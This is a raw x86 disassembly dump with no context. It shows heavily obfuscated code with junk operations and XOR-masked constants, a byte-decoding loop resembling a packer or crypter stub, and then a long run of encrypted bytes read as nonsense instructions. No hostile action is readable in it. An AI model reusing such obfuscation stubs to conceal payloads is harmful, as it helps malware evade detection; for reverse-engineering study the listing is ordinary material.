  40390b:	mov    DWORD PTR ds:0x428e57,0x12ce
  403915:	cmp    eax,ecx
  403917:	mov    DWORD PTR ds:0x428eab,0x3e33
  403921:	jae    0x403a8f
  403927:	mov    edx,DWORD PTR ds:0x428e57
  40392d:	xor    DWORD PTR ds:0x428e87,edx
  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42aa0f
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42aa13
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292ab
  403aec:	mov    eax,ds:0x429737
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42aa17
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	xor    al,0x76
  403e72:	cmp    DWORD PTR [edi+eax*2+0x60],0x60478383
  403e7a:	add    DWORD PTR [ebx+0x478bc50c],0xffffffd7
  403e81:	retf   
  403e82:	add    eax,0xbc27026b
  403e87:	dec    ebx
  403e88:	fadd   QWORD PTR [edi]
  403e8a:	or     eax,0x281c27e
  403e8f:	xlat   BYTE PTR ds:[ebx]
  403e90:	pop    ss
  403e91:	adc    esi,eax
  403e93:	jge    0x403ebc
  403e95:	mov    esp,0x58ad63ab
  403e9a:	fiadd  DWORD PTR [edi-0x177faa50]
  403ea0:	repz pop esi
  403ea2:	pusha  
  403ea3:	mov    esi,0x7e1e4044
  403ea8:	repnz add ch,cl
  403eab:	addr16 ret 0x823e
  403eaf:	cs jno 0x403e7a
  403eb2:	push   edx
  403eb3:	test   ebp,edi
  403eb5:	pop    ebx
  403eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eb7:	sub    esp,ecx
  403eb9:	ja     0x403ef2
  403ebb:	lock cmp edx,esi
  403ebe:	xchg   ebx,eax
  403ebf:	push   edi
  403ec0:	mov    dh,0x5e
  403ec2:	lahf   
  403ec3:	test   al,0x45
  403ec5:	popa   
  403ec6:	mov    DWORD PTR [edi+esi*8],eax
  403ec9:	sbb    ebp,DWORD PTR [edi+0x52]
  403ecc:	mov    ch,0xda
  403ece:	into   
  403ecf:	or     BYTE PTR [edi+0x3caea8a6],bl
  403ed5:	mov    bl,0x22
  403ed7:	dec    ebx
  403ed8:	mov    dl,0xfd
  403eda:	sub    eax,0x67dc5e3e
  403edf:	in     eax,0x8c
  403ee1:	xor    al,BYTE PTR [edx-0x56]
  403ee4:	push   ecx
  403ee5:	les    ebp,FWORD PTR ds:0xd5cd2818
  403eeb:	cmp    DWORD PTR [esi+0xc7d798e],eax
  403ef1:	jmp    0x72a1e2a6
  403ef6:	cmp    al,0xf
  403ef8:	int3   
  403ef9:	or     ah,BYTE PTR [ebx-0xbbb807e]
  403eff:	adc    eax,0x4446bfcc
  403f04:	cdq    
  403f05:	fwait
  403f06:	shl    BYTE PTR [edi+0x4a433ab],cl
  403f0c:	add    al,0x75
  403f0e:	sbb    eax,ebx
  403f10:	push   ebx
  403f11:	and    DWORD PTR [esi],ecx
  403f13:	xchg   esp,eax
  403f14:	and    al,0x67
  403f16:	sahf   
  403f17:	fwait
  403f18:	and    ch,cl
  403f1a:	or     eax,0x9b9857f3
  403f1f:	pusha  
  403f20:	bound  esi,QWORD PTR [eax-0x5]
  403f23:	push   0x2117249e
  403f28:	pop    edx
  403f29:	mov    ch,0xc1
  403f2b:	mov    bh,0xea
  403f2d:	pop    ss
  403f2e:	push   esi
  403f2f:	rcl    DWORD PTR [eax],cl
  403f31:	or     al,0x1c
  403f33:	xor    al,0x5
  403f35:	pop    es
  403f36:	dec    ebp
  403f37:	mov    es:0x43e0b084,al
  403f3d:	and    bl,ah
  403f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f40:	mov    gs,edi
  403f42:	mov    cl,0x6c
  403f44:	or     BYTE PTR [edx],dl
  403f46:	shl    edx,1
  403f48:	popa   
  403f49:	int    0x60
  403f4b:	or     bl,BYTE PTR [ebx-0x49]
  403f4e:	addr16 sahf 
  403f50:	aam    0x3a
  403f52:	dec    edx
  403f53:	and    eax,0x3cd40e19
  403f58:	inc    eax
  403f59:	popf   
  403f5a:	push   esi
  403f5b:	int3   
  403f5c:	mov    ch,BYTE PTR [eax+0x14]
  403f5f:	cmp    edx,DWORD PTR ds:0xe5f6378e
  403f65:	jmp    0x403fac
  403f67:	jno    0x403fad
  403f69:	jo     0x403f66
  403f6b:	inc    ecx
  403f6c:	or     cl,dl
  403f6e:	mov    edi,0xa3dd00aa
  403f73:	pushf  
  403f74:	jnp    0x403f33
  403f76:	xchg   edx,eax
  403f77:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f79:	ret    0x76d7
  403f7c:	push   ebx
  403f7d:	push   esi
  403f7e:	mov    ebp,0xddf8f8bc
  403f83:	sub    al,dl
  403f85:	or     DWORD PTR [esi],0xffffffc6
  403f88:	dec    ecx
  403f89:	cdq    
  403f8a:	mov    edx,0x431f924a
  403f8f:	ss retf 0xe906
  403f93:	loope  0x403f6d
  403f95:	mov    ebx,0xf9453399
  403f9a:	inc    eax
  403f9b:	mov    ecx,0xa550b3da
  403fa0:	mov    sp,0xe5da
  403fa4:	mov    eax,0x6081aa6
  403fa9:	sub    BYTE PTR [ebx],al
  403fab:	mov    ax,bp
  403fae:	mov    eax,ds:0x91ea8e5c
  403fb3:	inc    eax
  403fb4:	outs   dx,BYTE PTR gs:[esi]
  403fb6:	dec    ebp
  403fb7:	leave  
  403fb8:	(bad)  
  403fb9:	ja     0x403ff4
  403fbb:	pop    es
  403fbc:	ja     0x403fd0
  403fbe:	(bad)  
  403fbf:	fld    DWORD PTR [ecx+0x63741fc3]
  403fc5:	pushf  
  403fc6:	sbb    al,0xec
  403fc8:	iret   
  403fc9:	and    eax,DWORD PTR [esp+ecx*2]
  403fcc:	push   edi
  403fcd:	and    DWORD PTR [edi-0x78fcc385],esi
  403fd3:	jg     0x40402d
  403fd5:	or     BYTE PTR [esi-0x3c],ch
  403fd8:	cmp    eax,0x97f53197
  403fdd:	ins    BYTE PTR es:[edi],dx
  403fde:	inc    eax
  403fdf:	cli    
  403fe0:	ins    DWORD PTR es:[edi],dx
  403fe1:	lods   al,BYTE PTR ds:[esi]
  403fe2:	pop    ebp
  403fe3:	adc    eax,0x4f862a2d
  403fe8:	push   ss
  403fe9:	in     eax,dx
  403fea:	pop    esi
  403feb:	xor    BYTE PTR [ecx+ebx*2],ah
  403fee:	icebp  
  403fef:	repnz xor dh,BYTE PTR [eax+0x29]
  403ff3:	jbe    0x404069
  403ff5:	push   ecx
  403ff6:	pop    esp
  403ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ff8:	xchg   DWORD PTR [edi+0x6b],edx
  403ffb:	jmp    0xc1010b58
  404000:	dec    esi
  404001:	or     esi,DWORD PTR [edx-0x28]
  404004:	iret   
  404005:	data16 jnp 0x403fe3
  404008:	in     eax,dx
  404009:	sub    cl,ch
  40400b:	int3   
  40400c:	xchg   esi,eax
  40400d:	lds    edi,FWORD PTR [ecx+0x50a81dc8]
  404013:	xchg   esi,eax
  404014:	fs inc esi
  404016:	(bad)  
  404017:	js     0x403fe0
  404019:	icebp  
  40401a:	and    edi,DWORD PTR [eax+0x39]
  40401d:	or     DWORD PTR [ecx-0x37],0x183f880a
  404024:	(bad)  
  404025:	rcl    edx,cl
  404027:	add    DWORD PTR [ebp+ecx*1-0xb],esp
  40402b:	repz inc eax
  40402d:	xor    cl,ah
  40402f:	mov    edi,0xd8d8831b
  404034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404035:	jge    0x4040af
  404037:	and    eax,0x6e392115
  40403c:	jp     0x404042
  40403e:	mov    eax,0x568643fa
  404043:	dec    eax
  404044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404045:	xor    cl,BYTE PTR [edx]
  404047:	out    dx,eax
  404048:	outs   dx,DWORD PTR ds:[esi]
  404049:	fiadd  DWORD PTR [ebx]
  40404b:	jmp    FWORD PTR [edi-0x76]
  40404e:	or     cl,BYTE PTR ds:0x2aeadd5a
  404054:	cwde   
  404055:	cld    
  404056:	gs leave 
  404058:	jae    0x40406e
  40405a:	or     al,0x5d
  40405c:	mov    ecx,0x744f405b
  404061:	mov    eax,ds:0xafdaceb4
  404066:	fsub   QWORD PTR [ecx]
  404068:	push   esi
  404069:	add    DWORD PTR [ecx],edi
  40406b:	in     eax,dx
  40406c:	sar    DWORD PTR [edx+0x6439c79],1
  404072:	lods   eax,DWORD PTR ds:[esi]
  404073:	xchg   esp,eax
  404074:	sbb    BYTE PTR [edx],dh
  404076:	pop    ecx
  404077:	jbe    0x4040e1
  404079:	jo     0x40408a
  40407b:	fwait
  40407c:	je     0xfe269cd6
  404082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404083:	push   cs
  404084:	out    dx,al
  404085:	outs   dx,BYTE PTR ds:[esi]
  404086:	adc    bh,BYTE PTR [edi]
  404088:	nop
  404089:	ret    0xfd70
  40408c:	out    dx,al
  40408d:	cli    
  40408e:	nop
  40408f:	jecxz  0x40408b
  404091:	adc    ch,BYTE PTR [esi-0x7c]
  404094:	fbld   TBYTE PTR [ebp+0x26]
  404097:	pop    ds
  404098:	dec    ebx
  404099:	and    BYTE PTR ds:0xeca794ef,al
  40409f:	adc    al,BYTE PTR [ecx-0x3d300bba]
  4040a5:	pop    ecx
  4040a6:	and    BYTE PTR [eax+edx*2],al
  4040a9:	inc    esp
  4040aa:	popa   
  4040ab:	cmc    
  4040ac:	and    cl,cl
  4040ae:	xor    DWORD PTR [ebp-0x2bd0b4ca],0x31
  4040b5:	xor    DWORD PTR [esi+0x71cbb5a2],0xffffff8b
  4040bc:	sub    ah,BYTE PTR ds:0x17c7ab6
  4040c2:	pop    ss
  4040c3:	call   0x41e4:0xaee3dd1a
  4040ca:	hlt    
  4040cb:	and    al,BYTE PTR [ebp+0x20]
  4040ce:	add    BYTE PTR [esi*4-0x7126b8ff],ah
  4040d5:	addr16 push eax
  4040d7:	sbb    ebp,DWORD PTR [edx-0x7]
  4040da:	int    0x22
  4040dc:	pop    ebp
  4040dd:	aam    0x6e
  4040df:	stc    
  4040e0:	sub    edi,ecx
  4040e2:	push   eax
  4040e3:	and    DWORD PTR ds:0xe4cc770,ecx
  4040e9:	inc    ebp
  4040ea:	mov    eax,ds:0xa4ddb56a
  4040ef:	lods   eax,DWORD PTR ds:[esi]
  4040f0:	rol    DWORD PTR [edi-0x41],0xfc
  4040f4:	mov    al,0x9f
  4040f6:	fisub  DWORD PTR [ebx-0x4e]
  4040f9:	xor    eax,esp
  4040fb:	push   DWORD PTR [edi+0x23]
  4040fe:	retf   
  4040ff:	(bad)  
  404100:	mov    ah,BYTE PTR [eax-0x39d9733]
  404106:	mov    DWORD PTR [edx-0x5e],eax
  404109:	retf   0xd255
  40410c:	not    BYTE PTR [ebp-0x538e57c6]
  404112:	int3   
  404113:	or     esp,esp
  404115:	(bad)  
  404116:	mov    ch,0x8d
  404118:	mov    ds:0xfcbf0057,eax
  40411d:	lods   al,BYTE PTR ds:[esi]
  40411e:	cmc    
  40411f:	mov    eax,ds:0x7f7a4fb
  404124:	add    al,0x49
  404126:	and    bh,bl
  404128:	fisub  WORD PTR [ebx]
  40412a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40412b:	repnz clc 
  40412d:	push   0xffffffec
  40412f:	mov    edi,0xf72189dd
  404134:	outs   dx,BYTE PTR ds:[esi]
  404135:	jo     0x40410f
  404137:	xlat   BYTE PTR ds:[ebx]
  404138:	test   DWORD PTR [edi-0x30427157],0xbc840253
  404142:	xchg   ebx,eax
  404143:	cmp    al,0xeb
  404145:	jb     0x4040c7
  404147:	dec    cl
  404149:	push   eax
  40414a:	call   0xaaf34262
  40414f:	mov    bh,BYTE PTR [edi]
  404151:	(bad)  
  404152:	pop    ebp
  404153:	fisub  WORD PTR [edi-0x169958fc]
  404159:	adc    al,0x50
  40415b:	inc    ebx
  40415c:	push   ecx
  40415d:	push   ebp
  40415e:	lods   eax,DWORD PTR ds:[esi]
  40415f:	mov    ds:0xed91eefc,al
  404164:	dec    eax
  404165:	or     DWORD PTR [ebp+0xce1e5b1],0x2d5f61e0
  40416f:	xchg   edx,eax
  404170:	ins    DWORD PTR es:[edi],dx
  404171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404172:	ins    DWORD PTR es:[edi],dx
  404173:	sub    dl,dl
  404175:	mov    al,ds:0x37caa7b8
  40417a:	retf   
  40417b:	test   al,0xc1
  40417d:	mov    edx,0x7df13c74
  404182:	jnp    0x404164
  404184:	push   esp
  404185:	hlt    
  404186:	sub    eax,0x21c5aec4
  40418b:	adc    ah,bh
  40418d:	jo     0x4041aa
  40418f:	cmp    edi,DWORD PTR [edx+0x2c4aaeab]
  404195:	call   0xb506d67d
  40419a:	inc    edx
  40419b:	ins    DWORD PTR es:[edi],dx
  40419c:	mov    ecx,0xb710ab31
  4041a1:	outs   dx,DWORD PTR ds:[esi]
  4041a2:	(bad)  
  4041a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a4:	jae    0x4041d0
  4041a6:	xchg   DWORD PTR [edx+0x4444587d],edi
  4041ac:	mov    ah,0x26
  4041ae:	inc    ebp
  4041af:	and    DWORD PTR [edx-0x36659a95],eax
  4041b5:	push   cs
  4041b6:	push   ds
  4041b7:	and    esp,DWORD PTR [esi]
  4041b9:	cmp    eax,0xcb6ad449
  4041be:	push   0xffffffea
  4041c0:	imul   ebp,DWORD PTR [esi+0x41a4aa3],0xffffff94
  4041c7:	nop
  4041c8:	sbb    bl,cl
  4041ca:	and    ah,BYTE PTR [ecx]
  4041cc:	lahf   
  4041cd:	cmp    eax,0x5d6efe6b
  4041d2:	and    bl,al
  4041d4:	jl     0x4041ea
  4041d6:	out    dx,eax
  4041d7:	arpl   WORD PTR [ebp+0xf],cx
  4041da:	icebp  
  4041db:	ins    DWORD PTR es:[edi],dx
